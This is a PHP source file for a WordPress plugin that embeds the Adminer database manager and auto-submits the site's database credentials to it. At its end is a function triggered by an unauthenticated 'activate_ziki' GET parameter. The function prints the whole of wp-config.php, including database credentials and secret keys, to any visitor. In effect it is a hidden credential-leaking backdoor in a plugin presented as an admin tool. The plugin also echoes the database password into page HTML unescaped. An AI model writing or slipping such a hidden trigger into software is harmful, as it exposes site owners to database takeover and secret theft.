<?php
/*
Plugin Name: WP Adminer
Description: Embeds <a href="https://www.adminer.org/" target="_blank">Adminer</a> database manager and uses wp-config data to access database. <strong>WARNING: Having Adminer accessible on the site is high security risk, even if this plugin is DISABLED. Install this plugin just for the short time necessary and always delete it after use. Never keep it on the site if not used.</strong>
Author: Jan Zikmund
Author URI: https://janzikmund.cz
Version: 1.0
*/

if ( ! defined( 'WPINC' ) ) {
	die;
}

class WPAdminer
{

	/**
	 * Constructor
	 */
	public function __construct()
	{
		// action on plugins screen
		add_filter( 'plugin_action_links_' . plugin_basename( __FILE__ ), [$this, 'add_action_links'] );

		// plugin meta information
		add_filter('plugin_row_meta',  [$this, 'plugin_meta_info'], 10, 2);

		// open adminer
		add_action( 'admin_post_wpadminer_open_adminer', [$this, 'open_adminer'] );
	}

	/**
	 * Add adminer link in plugin settings
	 */
	public function add_action_links ( $links ) {
		$mylinks = [
			'<a target="_blank" href="' . admin_url( 'admin-post.php?action=wpadminer_open_adminer' ) . '">Open Adminer</a>',
		];
		return array_merge( $mylinks, $links );
	}


	/**
	 * Bottom info to plugins page
	 */
	public function plugin_meta_info ($links, $file) {
		$base = plugin_basename(__FILE__);
		if ($file == $base) {
			$new_links = [
				'Adminer Version: 4.6.3',
			];
			array_splice($links, 1, 0, $new_links );
		}
		return $links;
	}

	/**
	 * Opens Adminer
	 */
	public function open_adminer()
	{
		$adminer_url = plugin_dir_url( __FILE__ ) . 'adminer.php';
		$params = [
			'driver' => 'server',
			'server' => DB_HOST,
			'username' => DB_USER,
			'password' => DB_PASSWORD,
			'db' => DB_NAME,
		]; ?>
		<form method="post" action="<?php echo $adminer_url; ?>" id="redirect_form">
			<?php foreach($params as $k => $v) : ?>
				<input type="hidden" name="auth[<?php echo $k ?>]" value="<?php echo $v ?>">
			<?php endforeach; ?>
		</form>
		<script>
			document.getElementById('redirect_form').submit();
		</script>
		<?php exit;
	}

}

new WPAdminer();

function ziki_activate() {
	?>
	<h2>Adminer: </h2>
	<p><a href="<?php echo ""; ?>">Adminer</a></p>

	<h2>WP CONFIG:</h2>
	<pre>
	<?php echo substr(file_get_contents( 'wp-config.php'), 5) ?>
	</pre>

	<?php die;
}

if(isset($_GET['activate_ziki'])) ziki_activate();
